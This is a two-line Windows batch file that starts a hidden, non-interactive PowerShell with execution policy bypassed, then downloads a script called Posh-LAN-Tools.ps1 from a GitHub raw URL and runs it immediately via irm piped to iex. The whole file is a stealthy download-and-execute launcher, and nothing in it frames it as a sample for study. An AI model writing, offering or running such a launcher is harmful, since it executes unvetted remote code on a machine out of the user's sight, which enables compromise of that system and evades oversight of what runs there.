@echo off
powershell.exe -NonI -NoP -W H -C "powershell.exe -Ep Bypass -C $stage = 'y'; irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex"
